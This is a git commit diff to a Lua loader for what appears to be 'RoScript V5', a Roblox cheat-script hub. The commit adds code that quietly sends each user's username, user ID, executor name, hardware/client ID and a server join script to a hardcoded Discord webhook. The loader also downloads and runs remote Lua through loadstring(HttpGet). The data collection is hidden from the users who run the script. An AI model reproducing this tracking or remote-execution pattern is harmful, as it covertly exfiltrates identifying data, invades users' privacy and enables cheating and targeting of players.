552744c9e0d8d8be593f7136950fcd0be44d1bd7
ZgW4xKRn20s64WSI6spue4lEFvkhg4aX669QUHjn9SRSYdjELp <156532918+RScript-O0607O@users.noreply.github.com>
2024-02-02 14:18:24 +0800

    Update user-detect.lua

--- loader/user-detect.lua
+++ loader/user-detect.lua
@@ -3,11 +3,30 @@ if RoScript_Loaded == true then
   warn("Wait 5 seconds before executing again!")
   return
 end
-
 pcall(function() getgenv().RoScript_Loaded = true end)
-
-loadstring(game:HttpGet("https://github.com/RScript-O0607O/-4-4SH4-X0CP-9-QvzU9Vp-u-XtO7pKRxr-A-ggh-caVYh/raw/main/loader/exec-log.lua"))()
-
+if identifyexecutor() == "Synapse X" then
+    req = syn.request;
+else
+    req = http_request;
+end;
+local data = {
+    ["content"] = "";
+    ["embeds"] = {
+        {
+            ["title"] = "Oops! Someone executed!";
+            ["description"] = "**User Profile:** https://rblx.name/"..tostring(game:GetService("Players").LocalPlayer.UserId).."\n **Currently Playing:** https://rblx.games/"..game.PlaceId;
+            ["type"] = "rich";
+            ["color"] = nil;
+            ["fields"] = {
+                {
+                    ["name"] = "";
+                    ["value"] = "**Username:** "..game:GetService("Players").LocalPlayer.Name.."\n **User ID:** "..game:GetService("Players").LocalPlayer.UserId.."\n **Executor:** "..tostring(identifyexecutor()).."\n **Hardware ID: **"..game:GetService("RbxAnalyticsService"):GetClientId().." \n **Join Script:**"..[[```game:GetService("TeleportService"):TeleportToPlaceInstance(]]..game["PlaceId"]..[[, "]]..game["JobId"]..[[", game:GetService("Players").LocalPlayer)```]]
+                }
+            }
+            };
+    };
+}
+req({Url="https://discord.com/api/webhooks/1051349432769196072/V4Hcyys9WpFdltqfLa6v2cJGXQSr7LQrJAeB5f3RZvtE0BH0TBo2T5QfDc0NriwcHMDx",Body=game.HttpService:JSONEncode(data),Method="POST",Headers={["content-type"]="application/json"}})
 local http = game:GetService("HttpService")
 if writefile and isfile then
     if isfile("discord.json") == false then
@@ -55,20 +74,14 @@ task.spawn(function()
         end
     end
 end)
-
 pcall(function() getgenv().RoScript_Loaded = false end)
-
 local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
-
 Fluent:Notify({
     Title = "RoScript V5",
     Content = "Loading RoScript V5... | Please wait!",
     Duration = 8
 })
-
 wait(8.5)
-
--- Blacklisted IDs
 if game.Players.LocalPlayer.UserId == nil then
 Fluent:Notify({
     Title = "RoScript V5",
@@ -78,7 +91,6 @@ Fluent:Notify({
 wait(9)
 game:Shutdown()
 end
-
 if shared.RoAdmin then loadstring(game:HttpGet("https://github.com/RScript-O0607O/-4-4SH4-X0CP-9-QvzU9Vp-u-XtO7pKRxr-A-ggh-caVYh/raw/main/loader/scripts/admin.lua"))() else
   if game.PlaceId == 7952502098 or game.PlaceId == 1240123653 or game.PlaceId == 1632210982 or game.PlaceId == 12398414727 or game.PlaceId == 14469379009 or game.PlaceId == 11970456 or game.PlaceId == 2537430692 or game.PlaceId == 13924946576 or game.PlaceId == 8705534359 or game.PlaceId == 5059952999 or game.PlaceId == 11756661207 or game.PlaceId == 10679961467 or game.PlaceId == 11727501024 or game.PlaceId == 11103424163 or game.PlaceId == 12081110790 or game.PlaceId == 12081166311 or game.PlaceId == 14427937850 or game.PlaceId == 206640076 or game.PlaceId == 9961650006 or game.PlaceId == 3851622790 or game.PlaceId == 4620170611 then
     loadstring(game:HttpGet("https://github.com/RScript-O0607O/-4-4SH4-X0CP-9-QvzU9Vp-u-XtO7pKRxr-A-ggh-caVYh/raw/main/loader/scripts/id/"..game.PlaceId..".lua"))()
